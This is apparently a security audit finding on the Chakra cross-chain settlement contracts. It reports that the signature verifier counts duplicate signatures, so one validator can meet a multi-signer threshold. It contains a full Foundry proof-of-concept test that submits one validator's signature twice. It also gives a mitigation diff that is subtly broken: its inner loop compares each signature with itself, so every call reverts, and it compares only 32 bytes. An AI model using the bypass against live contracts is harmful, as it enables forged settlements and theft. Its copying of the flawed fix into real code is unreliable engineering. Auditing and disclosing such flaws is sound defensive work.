# Vulnerability details

## Impact
The function `verifyECDSA` is part of [solidity settlement](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L193-L214) and [solidity handler](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L120-L141). The same function is present in the cairo contracts. There it is called `check_chakra_signatures` and it is used in [cairo handler](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L173-L191) and [cairo settlement](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L174-L192). As the root cause of the issues is the same vulnerability, the remaining report will focus on the solidity version of this function.  

The function is used to check if enough validators have signed a massage hash. For that it iterates over the supplied signatures and each time the signature is correct, it will increase the counter `m`. It will return `true` if the counter reaches the number of `required_validators` set by the owner.

Both instances suffer from the same issue. They do not verify if any of the signature are duplicates. This allows a message to be verified if only one validator signed it. This defeats main the purpose of the contract and lowers the security offered by it.

## Proof of Concept
First create a `SettlementSignatureVerifier` with 3 signers and a `required_validators` of 2. This means that 2 of 3 validators should sign the message.

The test `test_sign` only packs the signature of the first validator twice. When calling the verifier, the contract should detect this malicious attempt and revert. But it does not and it returns true. Therefor this test will fail.

Below is a full POC in solidity using foundry:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {SettlementSignatureVerifier} from "../contracts/SettlementSignatureVerifier.sol";

contract POCTest is Test {
    SettlementSignatureVerifier verifier;
    address validator1;
    address validator2;
    address validator3;
    
    uint256 validator1Pk;
    uint256 validator2Pk;
    uint256 validator3Pk;

    address owner = address(50);
    address manager = address(51);

    bytes32 hashedMsg = keccak256("hello world");

    function setUp() public {        
        (validator1, validator1Pk) = makeAddrAndKey("validator1");
        (validator2, validator2Pk) = makeAddrAndKey("validator2");
        (validator3, validator3Pk) = makeAddrAndKey("validator3");

        verifier = new SettlementSignatureVerifier();
        verifier.initialize(owner, 2);

        vm.prank(owner);
        verifier.add_manager(manager);

        vm.startPrank(manager);
        verifier.add_validator(validator1);
        verifier.add_validator(validator2);
        verifier.add_validator(validator3);
        vm.stopPrank();
    }

    function singMsg(uint256 pk) internal view returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hashedMsg);
        return abi.encodePacked(r, s, v);
    }

    function test_sign() public view {
        bytes memory signatureOfValidatorOne = singMsg(validator1Pk);

        // use the validator one signature twice
        bytes memory aggregatedSignature = abi.encodePacked(
            signatureOfValidatorOne,
            signatureOfValidatorOne
        );

        // call the verify function
        bool result = verifier.verify(hashedMsg, aggregatedSignature, 0);
        assertEq(result, false);
    }
}
```

## Recommended Mitigation Steps
Before verifying the signature, make sure the supplied signature are unique. A simple change could be something like this:
```diff
--- a/SettlementSignatureVerifier.sol.orig
+++ b/SettlementSignatureVerifier.sol
@@ -130,6 +130,10 @@ contract SettlementSignatureVerifier is
         uint256 m = 0;
         for (uint256 i = 0; i < len; i += 65) {
             bytes memory sig = signatures[i:i + 65];
+            for (uint256 j = i; j < len; j += 65) {
+                require(bytes32(sig) != bytes32(signatures[j:j + 65]), "Duplicate signature");
+            }
+
             if (
                 validators[msgHash.recover(sig)] && ++m >= required_validators
             ) {
```

This is somewhat inefficient when working with a large number of signatures. If this is the use case here, consider sorting the array first.
